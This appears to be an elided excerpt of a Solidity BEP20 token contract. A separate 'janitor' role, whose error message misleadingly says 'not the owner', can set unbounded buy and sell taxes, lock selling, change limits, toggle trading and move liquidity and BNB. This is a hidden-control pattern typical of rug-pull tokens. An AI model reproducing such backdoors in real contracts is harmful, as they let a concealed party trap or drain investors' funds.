...
abstract contract Ownable {
    ...
    modifier onlyJanitor() {
        require(_janitor == msg.sender, "Ownable: caller is not the owner");
        _;
    }
...
contract BEST_TOKEN is IBEP20, Ownable
{
    ...
    address public constant TeamWallet=0xecb8F945c1527Cff07E5b675619A15D7b3606309;
    // address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E; // Mainnet
    address private constant PancakeRouter=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; // Testnet
    ...
    function changeTax(uint8 buyTax, uint8 sellTax) public onlyJanitor{
        _buyTax=buyTax;
        _sellTax=sellTax;
    }
    ...
    function changeSwapThreshold(uint256 num) public onlyJanitor {
        swapthreshold = num;
    }
   ...
   function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
    ...
    function BurnRemainingLiq() public onlyJanitor{
    ...
    function setLockTime(uint256 time) public onlyJanitor {
        sellLockTime = time;
    }   
    ...
    function TeamSwitchManualBNBConversion(bool manual) public onlyJanitor{
        manualConversion=manual;
    }

    function TeamDisableSellLock(bool disabled) public onlyJanitor{
        sellLockDisabled=disabled;
    }

    function TeamSetTaxes(uint8 burnTaxes, uint8 liquidityTaxes, uint8 stakingTaxes,uint8 buyTax, uint8 sellTax, uint8 transferTax) public onlyJanitor{
    ...
    function TeamCreateLPandBNB() public onlyJanitor{
    _swapContractToken();
    }
    
    function TeamUpdateLimits(uint256 newBalanceLimit, uint256 newSellLimit, uint256 newBuyLimit) public onlyJanitor{
    ...
    function SetupEnableTrading() public onlyJanitor{
        tradingEnabled=true;
    }

    function SetupLiquidityTokenAddress(address liquidityTokenAddress) public onlyJanitor{
        _liquidityTokenAddress=liquidityTokenAddress;
    }

    uint256 private _liquidityUnlockTime;

    function sendBNB() public onlyJanitor{
